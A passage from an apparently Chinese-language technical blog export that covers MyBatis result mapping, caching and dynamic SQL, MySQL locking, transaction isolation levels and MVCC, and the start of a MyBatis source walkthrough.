这使得进行映射非常简单。现在我们可以映射这个结果：\n&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt;  &lt;id property=&quot;id&quot; column=&quot;blog_id&quot; /&gt;  &lt;result property=&quot;title&quot; column=&quot;blog_title&quot;/&gt;  &lt;association property=&quot;author&quot; column=&quot;blog_author_id&quot; javaType=&quot;Author&quot; resultMap=&quot;authorResult&quot;/&gt;&lt;/resultMap&gt;&lt;resultMap id=&quot;authorResult&quot; type=&quot;Author&quot;&gt;  &lt;id property=&quot;id&quot; column=&quot;author_id&quot;/&gt;  &lt;result property=&quot;username&quot; column=&quot;author_username&quot;/&gt;  &lt;result property=&quot;password&quot; column=&quot;author_password&quot;/&gt;  &lt;result property=&quot;email&quot; column=&quot;author_email&quot;/&gt;  &lt;result property=&quot;bio&quot; column=&quot;author_bio&quot;/&gt;&lt;/resultMap&gt;\n\n在上面的例子中，你可以看到，博客（Blog）作者（author）的关联元素委托名为 “authorResult” 的结果映射来加载作者对象的实例。\n非常重要： id 元素在嵌套结果映射中扮演着非常重要的角色。\n你应该总是指定一个或多个可以唯一标识结果的属性。 \n虽然，即使不指定这个属性，MyBatis 仍然可以工作，但是会产生严重的性能问题。 \n只需要指定可以唯一标识结果的最少属性。显然，你可以选择主键（复合主键也可以）。\n现在，上面的示例使用了外部的结果映射元素来映射关联。这使得 Author 的结果映射可以被重用。 然而，如果你不打算重用它，或者你更喜欢将你所有的结果映射放在一个具有描述性的结果映射元素中。 你可以直接将结果映射作为子元素嵌套在内。这里给出使用这种方式的等效例子：\n&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt;  &lt;id property=&quot;id&quot; column=&quot;blog_id&quot; /&gt;  &lt;result property=&quot;title&quot; column=&quot;blog_title&quot;/&gt;  &lt;!-- 直接在这里映射 --&gt;  &lt;association property=&quot;author&quot; javaType=&quot;Author&quot;&gt;    &lt;id property=&quot;id&quot; column=&quot;author_id&quot;/&gt;    &lt;result property=&quot;username&quot; column=&quot;author_username&quot;/&gt;    &lt;result property=&quot;password&quot; column=&quot;author_password&quot;/&gt;    &lt;result property=&quot;email&quot; column=&quot;author_email&quot;/&gt;    &lt;result property=&quot;bio&quot; column=&quot;author_bio&quot;/&gt;  &lt;/association&gt;&lt;/resultMap&gt;\n\n那如果博客（blog）有一个共同作者（co-author）该怎么办？select 语句看起来会是这样的：\n&lt;select id=&quot;selectBlog&quot; resultMap=&quot;blogResult&quot;&gt;  select    B.id            as blog_id,    B.title         as blog_title,    A.id            as author_id,    A.username      as author_username,    A.password      as author_password,    A.email         as author_email,    A.bio           as author_bio,    CA.id           as co_author_id,    CA.username     as co_author_username,    CA.password     as co_author_password,    CA.email        as co_author_email,    CA.bio          as co_author_bio  from Blog B  left outer join Author A on B.author_id = A.id  left outer join Author CA on B.co_author_id = CA.id  where B.id = #&#123;id&#125;&lt;/select&gt;\n\n回忆一下，Author 的结果映射定义如下：\n&lt;resultMap id=&quot;authorResult&quot; type=&quot;Author&quot;&gt;  &lt;id property=&quot;id&quot; column=&quot;author_id&quot;/&gt;  &lt;result property=&quot;username&quot; column=&quot;author_username&quot;/&gt;  &lt;result property=&quot;password&quot; column=&quot;author_password&quot;/&gt;  &lt;result property=&quot;email&quot; column=&quot;author_email&quot;/&gt;  &lt;result property=&quot;bio&quot; column=&quot;author_bio&quot;/&gt;&lt;/resultMap&gt;\n\n由于结果中的列名与结果映射中的列名不同。你需要指定 columnPrefix 以便重复使用该结果映射来映射 co-author 的结果。\n&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt;  &lt;id property=&quot;id&quot; column=&quot;blog_id&quot; /&gt;  &lt;result property=&quot;title&quot; column=&quot;blog_title&quot;/&gt;  &lt;association property=&quot;author&quot;    resultMap=&quot;authorResult&quot; /&gt;  &lt;association property=&quot;coAuthor&quot;    resultMap=&quot;authorResult&quot;    columnPrefix=&quot;co_&quot; /&gt;   &lt;!-- 加一个前缀来帮助 --&gt;&lt;/resultMap&gt;\n\n你已经在上面看到了如何处理“有一个”类型的关联。但是该怎么处理“有很多个”类型的关联呢？这就是我们接下来要介绍的。\n集合&lt;collection property=&quot;posts&quot; ofType=&quot;domain.blog.Post&quot;&gt;  &lt;id property=&quot;id&quot; column=&quot;post_id&quot;/&gt;  &lt;result property=&quot;subject&quot; column=&quot;post_subject&quot;/&gt;  &lt;result property=&quot;body&quot; column=&quot;post_body&quot;/&gt;&lt;/collection&gt;\n\n集合元素和关联元素几乎是一样的，它们相似的程度之高，以致于没有必要再介绍集合元素的相似部分。 所以让我们来关注它们的不同之处吧。\n我们来继续上面的示例，一个博客（Blog）只有一个作者（Author)。但一个博客有很多文章（Post)。 在博客类中，这可以用下面的写法来表示：\nprivate List&lt;Post&gt; posts;\n\n要像上面这样，映射嵌套结果集合到一个 List 中，可以使用集合元素。 和关联元素一样，我们可以使用嵌套 Select 查询，或基于连接的嵌套结果映射集合。\n集合的嵌套 Select 查询首先，让我们看看如何使用嵌套 Select 查询来为博客加载文章。\n&lt;!--主查询--&gt;&lt;select id=&quot;selectBlog&quot; resultMap=&quot;blogResult&quot;&gt;  SELECT * FROM BLOG WHERE ID = #&#123;id&#125;&lt;/select&gt;&lt;!-- 结果集 映射--&gt;&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt;    &lt;!-- 封装集合 --&gt;  &lt;collection property=&quot;posts&quot; javaType=&quot;ArrayList&quot; column=&quot;id&quot; ofType=&quot;Post&quot; select=&quot;selectPostsForBlog&quot;/&gt;&lt;/resultMap&gt;&lt;select id=&quot;selectPostsForBlog&quot; resultType=&quot;Post&quot;&gt;  SELECT * FROM POST WHERE BLOG_ID = #&#123;id&#125;&lt;/select&gt;\n\n你可能会立刻注意到几个不同，但大部分都和我们上面学习过的关联元素非常相似。 \n首先，你会注意到我们使用的是集合元素。 \n接下来你会注意到有一个新的 “ofType” 属性。\n这个属性非常重要，它用来将 JavaBean（或字段）属性的类型和集合存储的类型区分开来。 所以你可以按照下面这样来阅读映射：\n&lt;collection property=&quot;posts&quot; javaType=&quot;ArrayList&quot; column=&quot;id&quot; ofType=&quot;Post&quot; select=&quot;selectPostsForBlog&quot;/&gt;\n\n读作： “posts 是一个存储 Post 的 ArrayList 集合”\n在一般情况下，MyBatis 可以推断 javaType 属性，因此并不需要填写。所以很多时候你可以简略成：\n&lt;collection property=&quot;posts&quot; column=&quot;id&quot; ofType=&quot;Post&quot; select=&quot;selectPostsForBlog&quot;/&gt;\n\n集合的嵌套结果映射现在你可能已经猜到了集合的嵌套结果映射是怎样工作的——除了新增的 “ofType” 属性，它和关联的完全相同。\n首先, 让我们看看对应的 SQL 语句：\n&lt;select id=&quot;selectBlog&quot; resultMap=&quot;blogResult&quot;&gt;  select  B.id as blog_id,  B.title as blog_title,  B.author_id as blog_author_id,  P.id as post_id,  P.subject as post_subject,  P.body as post_body,  from Blog B  left outer join Post P on B.id = P.blog_id  where B.id = #&#123;id&#125;&lt;/select&gt;\n\n我们再次连接了博客表和文章表，并且为每一列都赋予了一个有意义的别名，以便映射保持简单。 要映射博客里面的文章集合，就这么简单：\n&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt;  &lt;id property=&quot;id&quot; column=&quot;blog_id&quot; /&gt;  &lt;result property=&quot;title&quot; column=&quot;blog_title&quot;/&gt;  &lt;collection property=&quot;posts&quot; ofType=&quot;Post&quot;&gt;    &lt;id property=&quot;id&quot; column=&quot;post_id&quot;/&gt;    &lt;result property=&quot;subject&quot; column=&quot;post_subject&quot;/&gt;    &lt;result property=&quot;body&quot; column=&quot;post_body&quot;/&gt;  &lt;/collection&gt;&lt;/resultMap&gt;\n\n再提醒一次，要记得上面 id 元素的重要性，如果你不记得了，请阅读关联部分的相关部分。\n如果你喜欢更详略的、可重用的结果映射，你可以使用下面的等价形式：\n&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt;  &lt;id property=&quot;id&quot; column=&quot;blog_id&quot; /&gt;  &lt;result property=&quot;title&quot; column=&quot;blog_title&quot;/&gt;  &lt;collection property=&quot;posts&quot; ofType=&quot;Post&quot; resultMap=&quot;blogPostResult&quot; columnPrefix=&quot;post_&quot;/&gt;&lt;/resultMap&gt;&lt;resultMap id=&quot;blogPostResult&quot; type=&quot;Post&quot;&gt;  &lt;id property=&quot;id&quot; column=&quot;id&quot;/&gt;  &lt;result property=&quot;subject&quot; column=&quot;subject&quot;/&gt;  &lt;result property=&quot;body&quot; column=&quot;body&quot;/&gt;&lt;/resultMap&gt;\n\n缓存MyBatis 内置了一个强大的事务性查询缓存机制，它可以非常方便地配置和定制。 \n为了使它更加强大而且易于配置，我们对 MyBatis 3 中的缓存实现进行了许多改进。\n默认情况下，只启用了本地的会话缓存，它仅仅对一个会话中的数据进行缓存。 \n一级缓存一级缓存也叫本地缓存：\n\n与数据库同一次会话期间查询到的数据会放在本地缓存中。\n以后如果需要获取相同的数据，直接从缓存中拿，没必须再去查询数据库；\n默认是一级缓存\n\n二级缓存要启用全局的二级缓存，只需要在你的 SQL 映射文件中添加一行：\n&lt;cache/&gt;\n\n\n基本上就是这样。这个简单语句的效果如下:\n\n映射语句文件中的所有 select 语句的结果将会被缓存。\n映射语句文件中的所有 insert、update 和 delete 语句会刷新缓存。\n缓存会使用最近最少使用算法（LRU, Least Recently Used）算法来清除不需要的缓存。\n缓存不会定时进行刷新（也就是说，没有刷新间隔）。\n缓存会保存列表或对象（无论查询方法返回哪种）的 1024 个引用。\n缓存会被视为读&#x2F;写缓存，这意味着获取到的对象并不是共享的，可以安全地被调用者修改，而不干扰其他调用者或线程所做的潜在修改。\n\n\n二级缓存也叫全局缓存，一级缓存作用域太低了，所以诞生了二级缓存\n\n基于namespace级别的缓存，一个名称空间，对应一个二级缓存；\n\n工作机制\n\n\n一个会话查询一条数据，这个数据就会被放在当前会话的一级缓存中；\n如果当前会话关闭了，这个会话对应的一级缓存就没了；但是我们想要的是，会话关闭了，一级缓存中的数据被保存到二级缓存中；\n新的会话查询信息，就可以从二级缓存中获取内容；\n不同的mapper查出的数据会放在自己对应的缓存（map）中；\n\n\n\n提示 缓存只作用于 cache 标签所在的映射文件中的语句。\n如果你混合使用 Java API 和 XML 映射文件，在共用接口中的语句将不会被默认缓存。你需要使用 @CacheNamespaceRef 注解指定缓存作用域。\n这些属性可以通过 cache 元素的属性来修改。比如：\n&lt;cache  eviction=&quot;FIFO&quot;  flushInterval=&quot;60000&quot;  size=&quot;512&quot;  readOnly=&quot;true&quot;/&gt;\n\n这个更高级的配置创建了一个 FIFO 缓存，每隔 60 秒刷新，最多可以存储结果对象或列表的 512 个引用，而且返回的对象被认为是只读的，因此对它们进行修改可能会在不同线程中的调用者产生冲突。\n可用的清除策略有：\n\nLRU – 最近最少使用：移除最长时间不被使用的对象。\nFIFO – 先进先出：按对象进入缓存的顺序来移除它们。\nSOFT – 软引用：基于垃圾回收器状态和软引用规则移除对象。\nWEAK – 弱引用：更积极地基于垃圾收集器状态和弱引用规则移除对象。\n\n默认的清除策略是 LRU。\nflushInterval（刷新间隔）属性可以被设置为任意的正整数，设置的值应该是一个以毫秒为单位的合理时间量。 默认情况是不设置，也就是没有刷新间隔，缓存仅仅会在调用语句时刷新。\nsize（引用数目）属性可以被设置为任意正整数，要注意欲缓存对象的大小和运行环境中可用的内存资源。默认值是 1024。\nreadOnly（只读）属性可以被设置为 true 或 false。只读的缓存会给所有调用者返回缓存对象的相同实例。 因此这些对象不能被修改。这就提供了可观的性能提升。而可读写的缓存会（通过序列化）返回缓存对象的拷贝。 速度上会慢一些，但是更安全，因此默认值是 false。\n提示 二级缓存是事务性的。这意味着，当 SqlSession 完成并提交时，或是完成并回滚，但没有执行 flushCache&#x3D;true 的 insert&#x2F;delete&#x2F;update 语句时，缓存会获得更新。\n缓存原理\n只要开启了二级缓存，我们在同一个Mapper中的查询，可以在二级缓存中拿到数据\n查出的数据都会被默认先放在一级缓存中\n只有会话提交或者关闭以后，一级缓存中的数据才会转到二级缓存中\n\n一级缓存与二级缓存的执行顺序为：\n先查二级缓存，再查一级缓存，再查数据库；即使在一个sqlSession中，也会先查二级缓存；一个namespace中的查询更是如此。\n使用自定义缓存除了上述自定义缓存的方式，你也可以通过实现你自己的缓存，或为其他第三方缓存方案创建适配器，来完全覆盖缓存行为。\n&lt;cache type=&quot;com.domain.something.MyCustomCache&quot;/&gt;\n\n这个示例展示了如何使用一个自定义的缓存实现。type 属性指定的类必须实现 org.apache.ibatis.cache.Cache 接口，且提供一个接受 String 参数作为 id 的构造器。 这个接口是 MyBatis 框架中许多复杂的接口之一，但是行为却非常简单。\npublic interface Cache &#123;  String getId();  int getSize();  void putObject(Object key, Object value);  Object getObject(Object key);  boolean hasKey(Object key);  Object removeObject(Object key);  void clear();&#125;\n\n为了对你的缓存进行配置，只需要简单地在你的缓存实现中添加公有的 JavaBean 属性，然后通过 cache 元素传递属性值，例如，下面的例子将在你的缓存实现上调用一个名为 setCacheFile(String file) 的方法：\n&lt;cache type=&quot;com.domain.something.MyCustomCache&quot;&gt;  &lt;property name=&quot;cacheFile&quot; value=&quot;/tmp/my-custom-cache.tmp&quot;/&gt;&lt;/cache&gt;\n\n你可以使用所有简单类型作为 JavaBean 属性的类型，MyBatis 会进行转换。 你也可以使用占位符（如 $&#123;cache.file&#125;），以便替换成在配置文件属性中定义的值。\n从版本 3.4.2 开始，MyBatis 已经支持在所有属性设置完毕之后，调用一个初始化方法。 如果想要使用这个特性，请在你的自定义缓存类里实现 org.apache.ibatis.builder.InitializingObject 接口。\npublic interface InitializingObject &#123;  void initialize() throws Exception;&#125;\n\n提示 上一节中对缓存的配置（如清除策略、可读或可读写等），不能应用于自定义缓存。\n请注意，缓存的配置和缓存实例会被绑定到 SQL 映射文件的命名空间中。 因此，同一命名空间中的所有语句和缓存将通过命名空间绑定在一起。 每条语句可以自定义与缓存交互的方式，或将它们完全排除于缓存之外，这可以通过在每条语句上使用两个简单属性来达成。 默认情况下，语句会这样来配置：\n&lt;select ... flushCache=&quot;false&quot; useCache=&quot;true&quot;/&gt;&lt;insert ... flushCache=&quot;true&quot;/&gt;&lt;update ... flushCache=&quot;true&quot;/&gt;&lt;delete ... flushCache=&quot;true&quot;/&gt;\n\n鉴于这是默认行为，显然你永远不应该以这样的方式显式配置一条语句。但如果你想改变默认的行为，只需要设置 flushCache 和 useCache 属性。比如，某些情况下你可能希望特定 select 语句的结果排除于缓存之外，或希望一条 select 语句清空缓存。类似地，你可能希望某些 update 语句执行时不要刷新缓存。\n动态SQL动态 SQL 是 MyBatis 的强大特性之一。如果你使用过 JDBC 或其它类似的框架，你应该能理解根据不同条件拼接 SQL 语句有多痛苦，例如拼接时要确保不能忘记添加必要的空格，还要注意去掉列表最后一个列名的逗号。利用动态 SQL，可以彻底摆脱这种痛苦。\n使用动态 SQL 并非一件易事，但借助可用于任何 SQL 映射语句中的强大的动态 SQL 语言，MyBatis 显著地提升了这一特性的易用性。\n如果你之前用过 JSTL 或任何基于类 XML 语言的文本处理器，你对动态 SQL 元素可能会感觉似曾相识。在 MyBatis 之前的版本中，需要花时间了解大量的元素。借助功能强大的基于 OGNL 的表达式，MyBatis 3 替换了之前的大部分元素，大大精简了元素种类，现在要学习的元素种类比原来的一半还要少。\n\nif\nchoose (when, otherwise)\ntrim (where, set)\nforeach\n\n动态SQL的官方文档有很清晰的例子和解释\nhttps://mybatis.org/mybatis-3/zh/dynamic-sql.html\n\nTip总的来说 Mybatis的相关配置、xml和注解配置\n相关使用 结果集映射方法  三个关键类\n缓存机制、动态sql等\n主要的重点在这几块方面，当以后遇到问题，可供继续学习查找。\n","tags":["2021"]},{"title":"Mysql事务及MVCC","url":"/2021/08/20/2021/Mysql%E4%BA%8B%E5%8A%A1%E5%8F%8AMVCC/","content":"\n\nMysql的锁本文主要讲述Mysql事务机制、锁机制、MVCC机制等知识\n锁的定义锁是计算机协调多个进程或线程并发访问某一资源的机制。在数据库中，除了传统的计算资源（如CPU、RAM、I&#x2F;O等）的争用以外，数据也是一种供需要用户共享的资源。\n如何保证数据并发访问的一致性、有效性是所有数据库必须解决的一个问题，锁冲突也是影响数据库并发访问性能的一个重要因素。\n锁的分类Mysql中的锁按照不同方面分类，可以有以下三种分类：\n\n从性能上分为乐观锁和悲观锁\n\n悲观锁，正如其名，具有强烈的独占和排他特性。它指的是对数据被外界(包括本系统当前的其他事务，以及来自外部系统的事务处理)修改持保守态度。因此，在整个数据处理过程中，将数据处于锁定状态。\n悲观锁的实现，往往依靠数据库本身提供的锁机制实现。简单来说，就是只要我正在使用数据，别人都无法获取这条数据。\n乐观锁是相对悲观锁而言的，乐观锁假设数据一般情况下不会造成冲突，所有人都可以获取同一条数据，让用户决定如何去做。乐观锁可以通过版本号的方式实现，也就是在数据库表中添加一个版本号字段，用户拿到数据后和自己的版本号进行对比，如果不一致就跳过，一致则进行处理。相比于悲观锁而言，乐观锁的吞吐量更高。\n\n从对数据库操作的类型分，分为读锁和写锁\n\n读锁和写锁都属于悲观锁，它们两的区别如下：\n\n读锁（共享锁）：针对同一份数据，多个读操作可以同时进行而不会互相影响，但是不能进行写操作。\n写锁（排它锁）：针对同一份数据，当前写操作没有完成前，其他写操作和读操作都会被阻断。\n\n\n从对数据操作的粒度分，分为表锁和行锁\n\n\n表锁每次操作锁住整张表。它的特点是：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高，并发性能差。\n行锁每次操作锁住一行数据。它的特点是：开销大，加锁慢；会出现死锁；锁定粒度小，发生锁冲突的概率最低，并发性能高。\n\n对于不同的引擎而言，MyISAM引擎的表只有表锁，不支持事务；\n而InnoDB的表既有表锁也有行锁，并且支持事务。\nMysql事务隔离级别Mysql中设置了4种隔离级别来针对不同的问题，我们先来看看并发事务中可能存在的问题：\n并发事务处理带来的问题\n更新丢失（Lost Update）\n\n当两个或多个事务选择同一行，然后基于最初选定的值更新该行时，由于每个事务都不知道其他事务的存在，就会发生丢失更新问题，即最后的更新覆盖了由其他事务所做的更新。 这个问题可以通过乐观锁或者行锁解决。\n\n脏读（Dirty Reads）\n\n一个事务正在对一条记录做修改，在这个事务完成并提交前，这条记录的数据就处于不一致的状态；这时另一个事务也来读取同一条记录，如果不加控制，第二个事务读取了这些“脏”数据，并据此作进一步的处理，就会产生未提交的数据依赖关系。这种现象被形象的叫做“脏读”。\n一句话：事务A读取到了事务B已经修改但尚未提交的数据，还在这个数据基础上做了操作。此时，如果B事务回滚，A读取的数据无效，不符合事务一致性的要求。\n\n不可重读读（Non-Repeatable Reads）\n\n一个事务在读取某些数据后的某个时间，再次读取以前读过的数据，却发现其读出的数据已经发生了改变、或某些记录已经被删除了！这种现象就叫做“不可重复读”。\n一句话：事务A读取到了事务B已经提交的修改数据，不符合隔离性。\n\n幻读（Phantom Reads）\n\n一个事务按相同的查询条件重新读取以前检索过的数据，却发现其他事务插入了满足其查询条件的新数据，这种现象就称为“幻读”。\n一句话：事务A读取到了事务B提交的新增数据，不符合隔离性。\n四种事务隔离级别脏读、不可重复读和幻读其实都是数据库读一致性问题，必须由数据库提供一定的事务隔离机制来解决。 如下表所示：\n\n\n\n隔离级别\n脏读\n不可重复读\n幻读\n\n\n\n读未提交(Read uncommitted)\n可能\n可能\n可能\n\n\n读已提交(Read committed)\n不可能\n可能\n可能\n\n\n可重复读(Repeatable read)\n不可能\n不可能\n可能\n\n\n串行化(Serializable)\n不可能\n不可能\n不可能\n\n\n数据库的事务隔离越严格，并发副作用越小，但付出的代价也就越大。\n同时，不同的应用对读一致性和事务隔离程度的要求也是不同的，比如许多应用对不可重复读和幻读并不敏感，而更关心数据并发访问的能力。\nMysql.7版本通过show variables like &#39;tx_isolation&#39;;查看当前数据库的事务隔离级别\n而Mysql8则时通过show variables like &#39;transaction_isolation&#39;;查看。\nMysql默认的事务隔离级别为可重复读。\nMysql5.7版本可通过set tx_isolation=&#39;REPEATABLE-READ&#39;设置，Mysql8版本可通过set transaction_isolation=&#39;REPEATABLE-READ&#39;设置。\n\n可串行化隔离级别使用的是表锁。虽然串行化能解决幻读，但是这种隔离级别并发性极低，开发中很少会用到。\n那么在Mysql默认的可重复读级别下，有办法解决幻读吗？\n\n间隙锁在某些情况下可以解决幻读问题\n间隙锁就是给一个范围内的数据上锁。比如在一张表中，id从11到19的范围中没有数据，那么在事务一中执行update user  set name = &#39;liduoan&#39; where id &gt; 10 and id &lt;=20，则其他事务就没法在这个范围所包含的间隙里插入或修改任何数据。（间隙锁在可重复读级别下才会生效。）\n注意 这里的select还是基于MVCC处理的。\n\nMysql的MVCC机制详解介绍完了事务隔离级别，下面我们来介绍以下Mysql中重要的MVCC机制，个人认为，这个还是需要多看去理解清楚的：\nMVCC简介MVCC全称Multi-Version Concurrency Control，即多版本并发控制。\nMVCC是一种并发控制的方法，一般在数据库管理系统中，实现对数据库的并发访问，在编程语言中实现事务内存。\n我们知道，Mysql中的读和写是存在线程安全问题的，我们前面也介绍了脏读、幻读、不可重复读这些问题。\n如果只能通过普通地加锁来解决，那么这势必会影响效率，而MVCC就是一种针对读写冲突的无锁并发控制问题的解决方案。\n简单来说就是在不加锁的情况下，读（快照读）和写可以同时进行，而且互不影响。\n\n理解快照读和当前读：\n\n当前读像select lock in share mode，select for update， update，insert，delete这些操作都是一种当前读，为什么叫当前读？因为它读取的是记录的最新版本，读取时还要保证其他并发事务不能修改当前记录，会对读取的记录进行加锁。\n快照读像不加锁的select操作就是快照读，即不加锁的非阻塞读。快照读的前提是隔离级别不是串行化级别，串行化级别下的快照读会退化成当前读。之所以出现快照读的情况，是基于提高并发性能的考虑，快照读的实现是就是基于多版本并发控制，即MVCC。可以认为MVCC是行锁的一个变种，但它在很多情况下，避免了加锁操作，降低了开销；既然是基于多版本，即快照读可能读到的并不一定是数据的最新版本，而有可能是之前的历史版本。\n\n\nMysql中实现了MVCC这一理想概念，快照读就是其中一个具体非阻塞读功能。就像我们在可重复读事务隔离级别中所演示那样，无论其他事务如何修改数据，在本事务中读出的数据都是相同的。那到底是如何实现的？\nMVCC实现原理在MVCC的实现原理之前，先了解几个重要的概念：\n重要概念1、隐藏字段\n数据库表中每行记录除了我们自定义的字段外，还有数据库隐含的字段：\n\nDB_TRX_ID：最近修改(修改/插入)事务ID，用来记录最后一次修改该记录的事务ID。Mysql会给每个事务分配一个id，这个id是不断增长的，每次加1，所以事务越新id越大。\nDB_ROLL_PTR：回滚指针，指向这条记录的上一个版本。\nDB_ROW_ID：隐含的自增ID，即隐藏主键。如果数据表没有创建主键，InnoDB会自动以该列产生一个聚簇索引。\nflag字段：删除标记字段，记录被更新或删除并不代表真的删除，而是该标记字段变了。\n\n\n由于我们设置了自增的主键，因此DB_ROW_ID字段就不会出现。\n最重要的就是DB_TRX_ID和DB_ROLL_PTR这两个字段。\n这两个字段是事务ID和回滚指针，那么我们就需要去了解对应的undo日志了。\n2、undo日志\nundo log主要分为以下两种：\n\ninsert undo log代表事务在insert新记录时产生的undo log，只在事务回滚时需要，并且在事务提交后可以被立即丢弃。\nupdate undo log事务在进行update或delete时产生的undo log， 不仅在事务回滚时需要，在快照读时也需要，所以不能随便删除。只有在快速读或事务回滚不涉及该日志时，对应的日志才会被purge线程统一清除。\n\n\n什么是purge线程？\n从前面的分析可以看出，为了实现InnoDB的MVCC机制，更新或者删除操作都只是设置一下老记录的删除标记，并不真正将过时的记录删除。但是为了节省磁盘空间，InnoDB引擎有专门的purge线程来清理删除标记为true的记录，purge线程在安全的情况下，会清理删除标记为true的记录。\n\n对MVCC有帮助的实质是update undo log，可以将它理解为一条旧记录链。我们通过如下流程举例：\n\n从图中的过程就可以看出，不同事务或者相同事务的对同一记录的修改，会导致该记录的undo log成为一条记录链表，undo log的链首就是最新的旧记录，链尾就是最早的旧记录。除了最新数据，undo log中所有行的删除标签都为true。\n\n注意：只要一个事务开启，对数据进行了修改，数据记录链中都插入该事务id修改的记录，无论有没有提交。只是根据事务执行的结果会进行不同的操作，如果事务commit就会保留该记录，如果事务rollback就会删除该记录。\n\n3、Read View(读视图)\nRead View是非常重要的一个概念，一个事务进行快照读操作时，会生产一个读视图，即ReadView。在该事务执行的快照读的那一刻，会生成数据库系统当前的一个快照，记录并维护系统当前活跃事务的ID。\nRead View主要是用来做可见性判断的，它作为用来判断当前事务能够看到记录链中哪个版本的数据的条件。接下来我们着重介绍这一可见性判断的流程是如何实现的。\n主要流程Read View遵循一个可见性算法：\n对某行(几行)数据进行快照读时 (产生了Read View) ，会从这一行(几行)在记录链中的最新数据中，取出隐藏字段DB_TRX_ID的ID值，与Read View中维护的值进行某些比较，如果不符合可见性，那就通过DB_ROLL_PTR回滚指针去取出记录链中下一条数据的DB_TRX_ID继续比较。\n即从头到尾遍历记录链的DB_TRX_ID与当前Read View中的值进行比较，直到找到满足特定条件的DB_TRX_ID，那么对应的这条数据就是当前事务可见的最新旧记录。\n那Read View中究竟是什么？可以用下图简易理解\n\n更深刻的认识，我们需要理解源码中的几个值：\n\n\ncreator_trx_id\n对应源码中的m_creator_trx_id，即当前事务自己的ID。\n\nlive_txn_list系统当前活跃事务ID的数组，即所有当前未提交事务的ID。\n\nup_limit_id对应源码中的m_up_limit_id，即live_txn_list数组中的最小值。\n\nlow_limit_id对应源码中的m_low_limit_id，即ReadView生成时刻系统尚未分配的下一个事务ID，也就是当前系统中最大事务ID值+1。\n注意是当前系统的最大事务的ID，不是列表的最大+1\n\n\n下面的图可以帮助大家理解这几个值的关系：\n\n假设我们在当前事务中需要查询一行数据，那么就从这行对应记录链的最新数据中取出DB_TRX_ID的值，假设为TRX_ID。接着就要将TRX_ID与Read View中维护的值进行比较，判断这条数据是否可见，流程大致如下：\n\n首先比较TRX_ID &lt; up_limit_id，如果小于，则表明这条数据的操作事务在本事务开始前已经提交，对于本事务是可见的。否则进入下一步。\n再比较TRX_ID == creator_trx_id，如果等于，则表明这条数据是本事务自己操作的，对于自己当然可见。否则进入下一步。\n接下来判断 TRX_ID &gt;= low_limit_id ，如果大于，则表明这条数据的操作事务在当前读视图产生后才开始，对于本事务不可见。否则进入下一步。\n判断TRX_ID 是否在活跃事务数组live_txn_list中，如果不在，则说明这个事务在读视图生成前就已经提交了，那么其修改的数据本事务是可见的。如果在，则代表当前读视图生成时刻，这个事务还没提交，那么其修改的数据对于本事务也是不可见的，进入下一步。\n通过DB_ROLL_PTR回滚指针取出后面 一条数据，如果指针为空则说明没有满足条件的数据，返回空。否则回到第一步。\n\n流程图如下所示：\n\n不可重复读出现的原因读已提交与可重复读这两个事务隔离级的不同在于InnoDB的快照读时Read View生成时机不同，这也是为什么读已提交事务隔离级别会存在不可重复读：\n\n在可重复读隔离级别下的某个事务对某条记录的第一次快照读会创建一个快照及Read View，并且此后在调用快照读的时候，还是使用的是同一个Read View，所以只要当前事务在其他事务提交更新之前使用过快照读，那么之后的快照读使用的都是同一个Read View，所以对之后的修改不可见。\n而在读已提交级隔离级别下的，事务中每次快照读都会新生成一个新的Read View，这就是我们在读已提交隔离级别下的事务中可以看到别的事务提交的更新的原因。、\n\n","tags":["2021"]},{"title":"Mybatis究极解析","url":"/2021/05/21/2021/Mybatis%E7%A9%B6%E6%9E%81%E8%A7%A3%E6%9E%90/","content":"\n\nMybatis回顾MyBatis是一个持久层（ORM）框架，使用简单，学习成本较低。可以执行自己手写的SQL语句，比较灵活。但\n是MyBatis的自动化程度不高，移植性也不高，有时从一个数据库迁移到另外一个数据库的时候需要自己修改配\n置，所以称只为半自动ORM框架。官方文档链接\n传统JDBC和Mybatis相比的弊病传统的JDBC的操作过程大致分为如下几步：\n\n通过Class.forName()加载驱动\n通过DriverManager.getConnection()创建连接\n获取sql执行者prepareStatement并且通过其execute执行sql\n通过sql执行者的getResultSet方法获取结果集ResultSet进行解析\n\npublic static void main(String[] args) &#123;    try &#123;        Class.forName(&quot;com.mysql.jdbc.Driver&quot;);        Connection conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost/liduoan&quot;,                                                      &quot;root&quot;, &quot;root&quot;);        Statement statement = conn.createStatement();        ResultSet resultSet = statement.executeQuery(&quot;select * from user&quot;);    &#125; catch (Exception e) &#123;        e.printStackTrace();    &#125;&#125;\n\n获取驱动—创建连接—执行SQL—获取结果集\n上述也称之为四大组件\n传统JDBC的问题如下：\n\n数据库连接创建、释放频繁造成资源浪费，从而影响系统性能，使用数据库连接池可以解决问题。\nsql语句在java代码中硬编码，实际应用中sql的变化可能较大，造成代码维护不方便。\n使用preparedStatement向有占位符传递参数存在硬编码问题，因为sql中的where子句的条件不确定，\n\n同样是修改不方便。\n\n对结果集中解析存在硬编码问题，sql的变化导致解析代码的变化，系统维护不方便。\n\nmybatis对传统JDBC的解决方案\n\n在mybatis配置文件SqlMapConfig.xml中配置数据连接池，使用连接池管理数据库链接。\n将Sql语句配置在映射配置文件中与java代码分离。\nMybatis自动将java对象映射至sql语句，通过statement中的parameterType定义输入参数的类型。\nMybatis自动将sql执行结果映射至java对象，通过statement中的resultType定义输出结果的类型。\n\nMybatis使用具体看这篇博客\nMybatis源码分析解析配置文件\n我们知晓使用Mybatis的时候时先从以下两句代码开始的：\n// 将mybatis配置文件读取至流中Reader reader = Resources.getResourceAsReader(resource);// 通过SqlSessionFactoryBuilder的build方法构建SqlSessionFactory工厂// 这里会解析mybatis配置文件SqlSessionFactory sqlMapper = new SqlSessionFactoryBuilder().build(reader);\n\n我们看到先获取一个读取器，然后委托给SqlSessionFactoryBuilder()来执行build方法。\npublic class SqlSessionFactoryBuilder &#123;    //第一步    public SqlSessionFactory build(Reader reader) &#123;        return build(reader, null, null);    &#125;    //第二步    public SqlSessionFactory build(Reader reader, String environment, Properties properties) &#123;        try &#123;            